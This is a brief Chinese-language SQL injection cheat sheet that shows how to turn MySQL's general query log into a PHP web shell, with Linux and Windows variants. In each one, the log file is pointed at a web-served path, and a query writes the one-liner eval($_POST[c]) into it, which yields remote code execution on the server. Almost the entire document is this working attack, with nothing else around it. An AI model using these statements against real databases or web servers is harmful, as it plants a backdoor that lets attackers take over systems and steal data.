# SQL注入

## 1. 利用 Mysql 查询日志写 shell

* Linux

```text
set global general_log = 'ON';
set global general_log_file = '/var/www/html/shell.php'; # 该目录必须拥有写权限
select '?><?php eval($_POST[c]); ?>';
```

* Windows

```text
set global general_log = 'ON';
set global general_log_file = 'D:\\Program\\www\\localhost.log.php';
select '?><?php eval($_POST[c]); ?>';
```

